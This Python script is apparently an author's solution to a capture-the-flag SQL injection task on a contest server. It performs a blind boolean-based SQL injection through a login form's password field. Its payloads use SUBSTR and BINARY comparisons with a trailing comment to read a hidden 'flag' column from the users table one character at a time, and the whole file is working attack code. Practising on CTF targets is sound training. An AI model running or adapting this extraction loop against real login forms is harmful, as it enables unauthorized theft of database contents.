#!/usr/bin/env python3

# This is my solution to SQL injection task on http://tasks.ctfd.kncyber.pl:7013/.
# For correct work python sty module is needed.
# It can be installed with:
# python -m pip install sty
# This program demonstrate simple String extraction from system vulnerable to SQL injection.

import requests
import sys
from sty import fg


def main():
    flag = ""
    current_character = 32
    position = 1
    url = "http://tasks.ctfd.kncyber.pl:7013/"
    print(fg.green + '[+] ' + fg.rs + 'working...')
    while current_character != 127:
        found_character = check_character(url, position, current_character)
        if found_character is not None:
            flag += chr(found_character)
            sys.stdout.write('\033[2K\033[1G')
            print(fg.green + '[+] ' + fg.rs + 'new character on position ' + str(position) + ": " + flag)
            position += 1
            current_character = 32
        else:
            current_character += 1
            # these are forbidden characters in this task
            if current_character == 39 or current_character == 34:
                current_character += 1
            progress_bar(current_character)

    sys.stdout.write('\033[2K\033[1G')
    if len(flag) > 0:
        print(fg.yellow + '[!] ' + fg.rs + 'finally: ' + flag)
    else:
        print(fg.red + '[!] ' + fg.rs + 'fail')


def check_character(url, position, character):
    try:
        query = "'OR (SELECT SUBSTR(flag," + str(position) + ",1) FROM users) = '" + chr(character) + "' -- "
        # comment (--) is necessary to ignore closing ' on server side
        r = requests.post(url, data={'name': 'Robert', 'pass': query})
        if successful_login(r):
            if character + 32 > 127:
                return character  # there is no point to checking case for {} chars
            if try_character_case_sensitive(url, position, character) is not None:
                return character
            elif try_character_case_sensitive(url, position, character + 32) is not None:
                return character + 32
        else:
            return None
    except requests.exceptions.ConnectionError as e:
        print('\n' + fg.red + '[-] ' + fg.rs + 'Connection error has occured\n')
        exit()


def try_character_case_sensitive(url, position, character):
    query = "'OR (SELECT BINARY SUBSTR(flag," + str(position) + ",1) FROM users) = '" + chr(character) + "' -- "
    # BINARY is necessary for case sensivity
    r = requests.post(url, data={'name': 'Robert', 'pass': query})
    if successful_login(r):
        return character
    return None


def successful_login(r):
    if "Witaj, użytkowniku" in r.text:
        return True
    return False


def progress_bar(character):
    """Displays progress bar during searching for next character."""
    character = (character - 19) / 2
    character = int(character)
    sys.stdout.write('\r' + '[' + '#' * character + ' ' * (53 - character) + ']')


if __name__ == '__main__':
    main()
